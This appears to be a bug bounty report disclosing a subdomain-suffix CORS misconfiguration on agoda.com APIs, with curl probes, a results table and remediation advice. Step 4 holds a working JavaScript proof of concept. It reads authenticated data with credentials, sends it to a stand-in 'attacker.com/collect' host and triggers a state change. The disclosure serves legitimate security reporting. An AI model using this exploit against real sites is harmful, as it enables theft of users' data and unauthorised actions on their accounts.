# HackerOne Report: CORS Misconfiguration on www.agoda.com APIs

## Summary

All API endpoints on `www.agoda.com` (including the in-scope `/book/` paths) reflect the `Origin` header in the `Access-Control-Allow-Origin` response header when the origin ends with `.agoda.com`, while also setting `Access-Control-Allow-Credentials: true`. This allows any subdomain of `agoda.com` to make authenticated cross-origin requests to all Agoda APIs, enabling theft of user data and execution of state-changing actions on behalf of authenticated users.

## Asset

`www.agoda.com` (specifically `https://www.agoda.com/book/` and all API endpoints)

## Weakness

CORS Misconfiguration (Improper Origin Validation) — CWE-942

## Severity

**High** (CVSS 3.1: 8.1)

Vector: `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`

- Network attack vector, low complexity, no privileges required
- User interaction required (victim visits attacker-controlled page)
- Confidentiality and Integrity impact: High (data theft + state changes)
- Availability impact: None

## Description

The Agoda API server at `www.agoda.com` implements CORS origin validation using a substring match: any `Origin` header ending with `.agoda.com` is accepted and reflected back in `Access-Control-Allow-Origin`, with `Access-Control-Allow-Credentials: true`. This means any subdomain of `agoda.com` (e.g., `evil.agoda.com`) can make authenticated cross-origin requests to all Agoda APIs.

This is exploitable through:
1. **Subdomain takeover**: If any `*.agoda.com` subdomain has a dangling DNS record pointing to a deprovisioned cloud service, an attacker can claim it and host malicious JavaScript.
2. **XSS on any subdomain**: Any XSS vulnerability on any `*.agoda.com` subdomain becomes a full account takeover vector via CORS.
3. **Compromised subdomain**: Any compromised or low-security subdomain can be used as an attack platform.

The vulnerability is amplified by cookie configuration issues:
- `agoda.user.03` cookie (contains `UserId=...`) is set with `domain=.agoda.com`, `SameSite=None`, and **no `HttpOnly` flag** — meaning JavaScript on any subdomain can read the user's ID.
- Multiple session cookies (`t_pp`, `t_rc`) are set with `domain=.agoda.com` and `SameSite=None`, making them available for cross-site requests.

## Steps to Reproduce

### Step 1: Verify CORS reflection on API endpoints

```bash
# Test with an arbitrary *.agoda.com origin
curl -sS -D - 'https://www.agoda.com/api/cronos/layout/PageHeaderApi/UserMenuViewModel' \
  -H 'Origin: https://evil.agoda.com' \
  -H 'User-Agent: Mozilla/5.0' 2>&1 | grep -i 'access-control'
```

**Response headers:**
```
access-control-allow-origin: https://evil.agoda.com
access-control-allow-credentials: true
```

### Step 2: Verify on all major API endpoints

```bash
# Test multiple endpoints
for url in \
  'https://www.agoda.com/api/cronos/home/GetHomeContents' \
  'https://www.agoda.com/api/cronos/layout/GetHotCities' \
  'https://www.agoda.com/api/cronos/layout/PageHeaderApi/UserMenuViewModel' \
  'https://www.agoda.com/api/cronos/partnermember/partnerdata' \
  'https://www.agoda.com/api/cronos/favorite/addfavoritehotel' \
  'https://www.agoda.com/api/cronos/loyaltyexternal/insertmembership' \
  'https://www.agoda.com/api/cronos/loyaltyexternal/updatemembership' \
  'https://www.agoda.com/api/cronos/pointsmax/savepointsmax' \
  'https://www.agoda.com/book'; do
  echo "=== $url ==="
  curl -sS -D - -o /dev/null "$url" \
    -H 'Origin: https://evil.agoda.com' \
    -H 'User-Agent: Mozilla/5.0' 2>&1 | grep -i 'access-control'
  echo
done
```

**All endpoints return:**
```
access-control-allow-origin: https://evil.agoda.com
access-control-allow-credentials: true
```

### Step 3: Verify origin validation pattern

```bash
# Test various origin patterns
for origin in \
  'https://evil.agoda.com' \
  'https://sub.agoda.com' \
  'https://a.agoda.com' \
  'http://evil.agoda.com' \
  'https://agoda.com.evil.com' \
  'https://evilagoda.com' \
  'https://agoda.net' \
  'https://evil.agoda.net'; do
  echo -n "Origin: $origin -> "
  curl -sS -D - -o /dev/null 'https://www.agoda.com/api/cronos/layout/PageHeaderApi/UserMenuViewModel' \
    -H "Origin: $origin" \
    -H 'User-Agent: Mozilla/5.0' 2>&1 | grep -i 'access-control-allow-origin' | tr -d '\r'
done
```

**Results:**
| Origin | ACAO Response | Exploitable? |
|---|---|---|
| `https://evil.agoda.com` | `https://evil.agoda.com` | **Yes** |
| `https://sub.agoda.com` | `https://sub.agoda.com` | **Yes** |
| `https://a.agoda.com` | `https://a.agoda.com` | **Yes** |
| `http://evil.agoda.com` | `http://evil.agoda.com` | **Yes** |
| `https://agoda.com.evil.com` | (none) | No |
| `https://evilagoda.com` | (none) | No |
| `https://agoda.net` | (none) | No |
| `https://evil.agoda.net` | (none) | No |

The validation accepts any origin ending with `.agoda.com` (substring match on `.agoda.com` suffix).

### Step 4: PoC exploit (for authenticated user data theft)

Create the following HTML page and host it on any `*.agoda.com` subdomain (or a subdomain you control that ends with `.agoda.com`):

```html
<!DOCTYPE html>
<html>
<body>
<script>
// Steal authenticated user data from www.agoda.com APIs
fetch('https://www.agoda.com/api/cronos/layout/PageHeaderApi/UserMenuViewModel', {
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' }
})
.then(r => r.text())
.then(data => {
  // Send stolen data to attacker's server
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({ endpoint: 'UserMenuViewModel', data: data })
  });
  
  // Also steal user's loyalty/membership data
  return fetch('https://www.agoda.com/api/cronos/pointsmax/getmemberprograms', {
    credentials: 'include'
  });
})
.then(r => r.text())
.then(data => {
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({ endpoint: 'getmemberprograms', data: data })
  });
  
  // Perform state-changing action (add favorite hotel on behalf of user)
  return fetch('https://www.agoda.com/api/cronos/favorite/addfavoritehotel', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ hotelId: 12345 })
  });
})
.then(r => r.text())
.then(data => {
  console.log('State change result:', data);
});
</script>
</body>
</html>
```

When an authenticated Agoda user visits this page (hosted on any `*.agoda.com` subdomain), the attacker can:
1. Read the user's profile data (`UserMenuViewModel` returns user info when authenticated)
2. Read loyalty/membership program data
3. Perform state-changing actions (add favorites, update memberships)
4. Access partner data if the user is a hotel partner

## Impact

1. **User Data Theft**: An attacker can read authenticated API responses including user profile, loyalty membership, booking history, and partner data.
2. **State-Changing Actions**: An attacker can perform actions on behalf of the user — adding favorites, updating loyalty memberships, modifying cart items.
3. **Booking Interference**: The `/book/` paths (explicitly in scope) are also vulnerable, potentially allowing an attacker to interfere with booking flows.
4. **Cross-Subdomain Attack Surface**: The vulnerability affects ALL API endpoints on `www.agoda.com`, `ycs.agoda.com`, `analytics.agoda.com`, `bento.agoda.com`, and `hkg.agoda.com`.
5. **Cookie Amplification**: The `agoda.user.03` cookie (containing `UserId`) is set with `domain=.agoda.com`, no `HttpOnly`, and `SameSite=None`, making it readable via JavaScript on any subdomain and available for cross-site requests.

### Affected Endpoints (confirmed)
- `https://www.agoda.com/book` (in-scope)
- `https://www.agoda.com/api/cronos/layout/PageHeaderApi/UserMenuViewModel`
- `https://www.agoda.com/api/cronos/home/GetHomeContents`
- `https://www.agoda.com/api/cronos/partnermember/partnerdata`
- `https://www.agoda.com/api/cronos/favorite/addfavoritehotel`
- `https://www.agoda.com/api/cronos/loyaltyexternal/insertmembership`
- `https://www.agoda.com/api/cronos/loyaltyexternal/updatemembership`
- `https://www.agoda.com/api/cronos/pointsmax/savepointsmax`
- `https://www.agoda.com/api/cronos/pointsmax/getmemberprograms`
- `https://www.agoda.com/api/cronos/layout/notification/get`
- `https://www.agoda.com/api/review/get-last-pending-review`
- `https://www.agoda.com/api/cronos/layout/GetHotCities`
- `https://www.agoda.com/api/cronos/layout/culture/getlanguages`
- `https://www.agoda.com/api/cronos/layout/currency/getlist`
- `https://www.agoda.com/api/cronos/mkt/GetConsentBanner`
- `https://www.agoda.com/api/cronos/layout/GetCalendarExtrasAsync/`
- `https://ycs.agoda.com/api/`
- `https://analytics.agoda.com/api/`
- `https://bento.agoda.com/api/`
- `https://hkg.agoda.com/api/`

## Supporting Material/References

- CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- OWASP CORS Misconfiguration: https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
- Browser CORS specification: https://fetch.spec.whatwg.org/#cors-protocol

## Remediation

1. **Use strict origin allowlist**: Instead of substring matching, maintain an explicit list of allowed origins (e.g., `https://www.agoda.com`, `https://m.agoda.com`).
2. **Never reflect arbitrary origins**: Do not echo back the `Origin` header value. Only return pre-configured, trusted origins in `Access-Control-Allow-Origin`.
3. **Restrict `Access-Control-Allow-Credentials`**: Only set `ACAC: true` for origins that truly need credentialed access.
4. **Fix cookie security**:
   - Set `HttpOnly` on `agoda.user.03`, `agoda.version.03`, `agoda.attr.fe`, `agoda.price.trk.01`, `agoda.price.01`, `agoda.analytics`, `agoda.prius`
   - Set `SameSite=Lax` or `SameSite=Strict` instead of `SameSite=None` where possible
   - Consider scoping cookies to `www.agoda.com` instead of `.agoda.com` where subdomain sharing is not needed
